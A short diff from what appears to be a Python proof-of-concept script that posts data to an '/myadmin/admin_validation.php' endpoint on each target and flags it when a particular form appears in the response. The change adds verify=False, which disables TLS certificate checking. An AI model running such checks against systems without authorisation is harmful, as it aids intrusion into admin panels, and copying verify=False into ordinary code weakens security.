@@ -30,7 +30,7 @@ def poc(url):
             continue
         target = each.rstrip('/') + '/myadmin/admin_validation.php'
         try:
-            r = requests.post(target, data=data, timeout=15)
+            r = requests.post(target, data=data, timeout=15, verify=False)
             if 'form name="frmNextstep"' in r.content:
                 return target
         except Exception:
